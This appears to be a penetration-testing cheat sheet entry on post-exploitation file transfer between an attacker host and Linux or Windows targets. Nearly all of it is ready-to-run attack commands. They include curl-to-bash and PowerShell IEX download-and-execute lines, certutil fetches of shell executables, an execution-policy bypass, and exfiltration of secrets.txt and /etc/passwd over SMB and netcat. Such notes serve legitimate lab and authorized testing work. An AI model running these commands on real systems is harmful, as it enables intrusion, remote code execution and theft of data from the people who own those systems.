---
description: |
  Transfer files between attacker and target using HTTP servers, wget, curl, PowerShell, certutil, SMB, SCP, netcat, base64 encoding, and RDP drive sharing.
command: |
  # HTTP Server (Attacker)
  # Start HTTP server on attacker to host files:
  python3 -m http.server 80
  python3 -m http.server 8000
  php -S 0.0.0.0:80

  # Linux Target — Download Files
  # Download with wget:
  wget http://10.10.10.21/linpeas.sh -O /tmp/linpeas.sh
  wget http://10.10.10.21/file -O /tmp/file
  wget http://10.10.10.21:8000/exploit -P /tmp/

  # Download with curl:
  curl http://10.10.10.21/linpeas.sh -o /tmp/linpeas.sh
  curl http://10.10.10.21/file -o /tmp/file
  curl http://10.10.10.21/shell.sh | bash

  # Download and execute in one line:
  wget http://10.10.10.21/linpeas.sh -O - | bash
  curl http://10.10.10.21/linpeas.sh | bash

  # Windows Target — PowerShell Downloads
  # Invoke-WebRequest (IWR):
  Invoke-WebRequest -Uri http://10.10.10.21/winpeas.exe -OutFile C:\Temp\winpeas.exe
  IWR -Uri http://10.10.10.21/file -OutFile C:\Temp\file

  # WebClient DownloadFile:
  (New-Object Net.WebClient).DownloadFile('http://10.10.10.21/shell.exe','C:\Temp\shell.exe')

  # Download and execute in memory (fileless):
  IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.21/script.ps1')
  IEX(IWR http://10.10.10.21/script.ps1 -UseBasicParsing)

  # PowerShell download with bypass:
  powershell -ep bypass -c "IWR -Uri http://10.10.10.21/file -OutFile C:\Temp\file"

  # Windows Target — Certutil Downloads
  # Certutil (built-in, often not blocked):
  certutil -urlcache -f http://10.10.10.21/shell.exe C:\Temp\shell.exe
  certutil --urlcache -f http://10.10.10.21:8000/nc.exe C:\Users\Public\nc.exe
  certutil -urlcache -f http://10.10.10.21/winpeas.exe C:\Users\Public\winpeas.exe

  # SMB File Transfer
  # Start SMB server on attacker (no auth):
  impacket-smbserver share $(pwd) -smb2support

  # Start SMB server with authentication (needed for newer Windows):
  impacket-smbserver share $(pwd) -smb2support -user sec_user -password P@ssw0rd

  # Copy from SMB share on Windows target:
  copy \\10.10.10.21\share\shell.exe C:\Temp\shell.exe
  copy \\10.10.10.21\share\file C:\Temp\file

  # Mount SMB share with credentials on Windows target:
  net use Z: \\10.10.10.21\share /user:sec_user P@ssw0rd
  copy Z:\shell.exe C:\Temp\shell.exe

  # Copy files TO attacker via SMB (exfiltration):
  copy C:\Users\sec_user\Desktop\secrets.txt \\10.10.10.21\share\secrets.txt

  # SCP Transfer
  # Upload to target:
  scp linpeas.sh sec_user@10.10.10.27:/tmp/linpeas.sh
  scp file sec_user@10.10.10.27:/tmp/file

  # Download from target:
  scp sec_user@10.10.10.27:/tmp/loot.txt ./loot.txt

  # Recursive directory transfer:
  scp -r /tmp/tools sec_user@10.10.10.27:/tmp/tools

  # Netcat File Transfer
  # Receiver (attacker — start first):
  nc -lvnp 1234 > file

  # Sender (target — send the file):
  nc 10.10.10.21 1234 < file

  # Send with progress indication:
  nc 10.10.10.21 1234 < /etc/passwd && echo "[+] Transfer complete"

  # Base64 Encoding (No File Transfer Needed)
  # Encode on target, decode on attacker:
  # On target:
  base64 -w 0 /tmp/secret.txt
  # Copy output, then on attacker:
  echo "BASE64_STRING_HERE" | base64 -d > secret.txt

  # Windows base64 encode:
  certutil -encode C:\Temp\file.exe encoded.txt
  type encoded.txt

  # xfreerdp Drive Sharing
  # Mount local folder on RDP session:
  xfreerdp /v:10.10.10.27 /u:sec_user /p:'P@ssw0rd' /drive:share,/tmp/tools

  # Access mounted drive in RDP session:
  # In the RDP session, the shared folder appears at:
  # \\tsclient\share
  copy \\tsclient\share\winpeas.exe C:\Temp\winpeas.exe

  # xfreerdp with dynamic resolution:
  xfreerdp /v:10.10.10.27 /u:sec_user /p:'P@ssw0rd' /drive:share,/tmp/tools /dynamic-resolution
items:
  - Shell
phase:
  - Post-Exploitation
target_os:
  - Linux
  - Windows
services: []
techniques: []
references:
  - https://book.hacktricks.xyz/generic-methodologies-and-resources/exfiltration
---
